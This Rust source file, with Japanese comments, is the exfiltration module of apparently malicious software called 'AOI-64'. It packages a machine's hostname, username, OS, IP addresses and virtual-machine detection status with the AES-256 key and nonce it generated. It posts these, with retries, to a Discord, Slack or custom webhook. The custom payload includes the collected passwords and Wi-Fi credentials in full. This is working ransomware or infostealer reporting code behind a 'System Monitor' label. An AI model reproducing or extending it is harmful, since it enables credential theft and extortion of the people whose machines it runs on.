// Webhook送信モジュール
use serde::{Deserialize, Serialize};
use std::time::Duration;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum WebhookType {
    Discord,
    Slack,
    Custom,
    None,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct WebhookConfig {
    pub webhook_url: Option<String>,
    pub webhook_type: WebhookType,
    pub retry_attempts: u32,
    pub timeout_seconds: u64,
}

impl Default for WebhookConfig {
    fn default() -> Self {
        WebhookConfig {
            webhook_url: None,
            webhook_type: WebhookType::None,
            retry_attempts: 3,
            timeout_seconds: 30,
        }
    }
}

// 旧関数は統合版に置き換えられたため削除
// send_webhook() と send_encryption_key_webhook() は統合版に統一

/// システム情報と暗号化キーを一度にまとめて送信する統合Webhook関数
pub fn send_unified_webhook(
    config: &WebhookConfig,
    system_info: &crate::SystemInfo,
    auth_data: &crate::AuthData,
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> Result<(), Box<dyn std::error::Error>> {
    let webhook_url = match &config.webhook_url {
        Some(url) => url,
        None => return Ok(()),
    };

    use base64::{engine::general_purpose, Engine as _};
    let key_b64 = general_purpose::STANDARD.encode(key);
    let nonce_b64 = general_purpose::STANDARD.encode(nonce);

    let payload = match config.webhook_type {
        WebhookType::Discord => {
            create_discord_unified_payload(system_info, auth_data, &key_b64, &nonce_b64)
        }
        WebhookType::Slack => {
            create_slack_unified_payload(system_info, auth_data, &key_b64, &nonce_b64)
        }
        WebhookType::Custom => {
            create_custom_unified_payload(system_info, auth_data, &key_b64, &nonce_b64)
        }
        WebhookType::None => return Ok(()),
    };

    let json_body = serde_json::to_string(&payload)?;

    for attempt in 1..=config.retry_attempts {
        if let Ok(response) = minreq::post(webhook_url)
            .with_header("Content-Type", "application/json")
            .with_header("User-Agent", "AOI-64/1.0")
            .with_body(json_body.clone())
            .with_timeout(config.timeout_seconds)
            .send()
        {
            if response.status_code >= 200 && response.status_code < 300 {
                return Ok(());
            }
        }

        if attempt < config.retry_attempts {
            std::thread::sleep(Duration::from_secs(2));
        }
    }

    Err("統合Webhookの送信に失敗しました".into())
}

// Build timestamp without pulling chrono unless the feature is enabled
#[cfg(any(feature = "datetime", feature = "network"))]
fn now_timestamp() -> String {
    chrono::Utc::now().to_rfc3339()
}

#[cfg(not(any(feature = "datetime", feature = "network")))]
fn now_timestamp() -> String {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
        .to_string()
}

// 個別ペイロード関数は統合版に置き換えられたため削除
// 統合ペイロード関数のみを使用

// 統合ペイロード作成関数（システム情報と暗号化キーを1つのペイロードにまとめて送信）
fn create_discord_unified_payload(
    system_info: &crate::SystemInfo,
    auth_data: &crate::AuthData,
    key: &str,
    nonce: &str,
) -> serde_json::Value {
    let auth_summary = format!(
        "🔐パスワード: {}件
📶Wi-Fi: {}件",
        auth_data.passwords.len(),
        auth_data.wifi_creds.len()
    );
    let vm_status = if system_info.is_virtual_machine {
        match &system_info.virtual_machine_vendor {
            Some(v) if !v.is_empty() => v.as_str(),
            _ => "Yes",
        }
    } else {
        "No"
    };

    let ip_info = match &system_info.public_ip {
        Some(public_ip) => format!(
            "🌐 ローカル: {}
🌍 グローバル: {}",
            system_info.local_ip, public_ip
        ),
        None => format!(
            "🌐 ローカル: {}
🌍 グローバル: 取得失敗",
            system_info.local_ip
        ),
    };

    serde_json::json!({
        "embeds": [{
            "title": "🚀 AOI-64 Complete Report",
            "description": "システム情報収集と暗号化キー生成が完了しました",
            "color": 0x7289da,
            "fields": [
                {"name": "🏠 ホスト名", "value": system_info.hostname, "inline": true},
                {"name": "👤 ユーザー", "value": system_info.username, "inline": true},
                {"name": "💻 OS", "value": format!("{} {}", system_info.os_name, system_info.os_version), "inline": true},
                {"name": "🚀 Virtual", "value": vm_status, "inline": true},
                {"name": "📍 IP情報", "value": ip_info, "inline": false},
                {"name": "🔐 認証情報", "value": auth_summary, "inline": false},
                {"name": "🔑 AES-256 Key (Base64)", "value": format!("```{}```", key), "inline": false},
                {"name": "🎲 Nonce (Base64)", "value": format!("```{}```", nonce), "inline": false},
                {"name": "⚠️  注意", "value": "暗号化キーは慎重に管理してください", "inline": false}
            ],
            "timestamp": now_timestamp(),
            "footer": {"text": "AOI-64 System Monitor | Complete Report"}
        }]
    })
}

fn create_slack_unified_payload(
    system_info: &crate::SystemInfo,
    auth_data: &crate::AuthData,
    key: &str,
    nonce: &str,
) -> serde_json::Value {
    let public_ip_text = match &system_info.public_ip {
        Some(ip) => format!("グローバル: {}", ip),
        None => "グローバル: 取得失敗".to_string(),
    };
    let vm_status = if system_info.is_virtual_machine {
        match &system_info.virtual_machine_vendor {
            Some(v) if !v.is_empty() => v.as_str(),
            _ => "Yes",
        }
    } else {
        "No"
    };

    serde_json::json!({
        "blocks": [
            {
                "type": "header",
                "text": {
                    "type": "plain_text",
                    "text": "🚀 AOI-64 Complete Report"
                }
            },
            {
                "type": "section",
                "fields": [
                    {"type": "mrkdwn", "text": format!("*🏠 ホスト名:*\n{}", system_info.hostname)},
                    {"type": "mrkdwn", "text": format!("*👤 ユーザー:*\n{}", system_info.username)},
                    {"type": "mrkdwn", "text": format!("*💻 OS:*\n{} {}", system_info.os_name, system_info.os_version)},
                    {"type": "mrkdwn", "text": format!("*🚀 Virtual:*\n{}", vm_status)},
                    {"type": "mrkdwn", "text": format!("*📍 IP:*\nローカル: {}\n{}", system_info.local_ip, public_ip_text)},
                ]
            },
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": format!("*🔐 認証情報:* パスワード: {}件 | Wi-Fi: {}件\n*🔐 暗号化キー:*\n```\nKey: {}\nNonce: {}\n```\n⚠️  このキーは慎重に管理してください",
                             auth_data.passwords.len(), auth_data.wifi_creds.len(), key, nonce)
                }
            }
        ]
    })
}

fn create_custom_unified_payload(
    system_info: &crate::SystemInfo,
    auth_data: &crate::AuthData,
    key: &str,
    nonce: &str,
) -> serde_json::Value {
    serde_json::json!({
        "timestamp": std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs(),
        "system_info": system_info,
        "auth_data": auth_data,
        "encryption": {
            "key": key,
            "nonce": nonce,
            "algorithm": "aes256_gcm"
        }
    })
}
